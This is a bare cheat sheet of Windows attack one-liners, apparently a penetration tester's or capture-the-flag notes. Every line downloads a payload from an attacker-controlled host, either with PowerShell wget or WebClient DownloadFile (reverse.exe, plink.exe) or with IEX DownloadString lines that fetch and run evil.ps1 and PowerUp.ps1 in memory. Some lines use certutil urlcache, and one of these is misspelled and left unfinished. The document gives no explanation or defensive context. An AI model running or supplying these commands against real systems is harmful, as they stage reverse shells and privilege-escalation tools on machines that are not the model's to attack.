powershell wget "http://10.10.14.34/reverse.exe" -outfile "reverse.exe" 

powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.34/reverse.exe', 'reverse.exe')"

wget http://10.10.14.34/taskkill.exe -UseBasicParsing -OutFile taskkill.exe

"powershell \"IEX(New-Object Net.WebClient)downloadString('http://IP/evil.ps1')\""

powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.34/plink.exe', 'plink.exe')"

IEX(New-Object Net.WebClient)downloadString('http://IP/evil.ps1')

IEX(New-Object Net.WebClient)downloadString('http://10.10.14.34/ray64.exe')

fexec=echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.34/PowerUp.ps1') | powershell -noprofile

urlcache -f http://x.x.x.x/myfile newfile

cerutil urlcache -f 
